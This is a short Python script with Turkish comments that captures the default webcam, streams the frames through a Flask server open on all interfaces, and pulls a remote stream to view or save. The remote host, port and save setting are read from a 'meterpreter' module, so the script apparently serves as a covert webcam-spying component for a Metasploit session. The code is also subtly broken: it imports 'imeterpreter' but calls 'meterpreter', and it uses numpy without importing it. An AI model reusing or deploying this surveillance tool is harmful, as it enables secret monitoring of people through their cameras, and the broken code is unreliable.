import cv2
import threading
from flask import Flask, Response
from PIL import Image
from io import BytesIO
import requests
import imeterpreter

app = Flask(__name__)

camera = cv2.VideoCapture(0)  # Varsayılan webcam

def generate_frames():
    while True:
        success, frame = camera.read()
        if not success:
            break
        else:
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

def start_server(host, port):
    app.run(host=host, port=port, debug=False)

def client_view(host, port, save_to_file=False):
    url = f"http://{host}:{port}/video_feed"
    response = requests.get(url, stream=True)
    bytes_data = b''
    if save_to_file:
        file_name = "remote_stream.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(file_name, fourcc, 20.0, (640, 480))
    for chunk in response.iter_content(chunk_size=1024):
        bytes_data += chunk
        a = bytes_data.find(b'\xff\xd8')  # JPEG start
        b = bytes_data.find(b'\xff\xd9')  # JPEG end
        if a != -1 and b != -1:
            jpg = bytes_data[a:b+2]
            bytes_data = bytes_data[b+2:]
            image = Image.open(BytesIO(jpg))
            image.show()  # Görüntüleme için

            if save_to_file:
                frame = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
                out.write(frame)
    if save_to_file:
        out.release()
    cv2.destroyAllWindows()

def main():
    # Server ayarları
    server_host = '0.0.0.0'
    server_port = 5000
    # Remote ayarları
    remote_host = meterpreter.__RHOST__
    remote_port = meterpreter.__RPORT__
    save_to_file = meterpreter.__SVFile__ # Akışı dosyaya kaydetmek istiyorsanız True yapın

    print(f"Sunucu başlatılıyor: {server_host}:{server_port}")
    threading.Thread(target=start_server, args=(server_host, server_port)).start()

    print(f"Client olarak bağlanılıyor: {remote_host}:{remote_port}")
    client_view(remote_host, remote_port, save_to_file)

if __name__ == '__main__':
    main()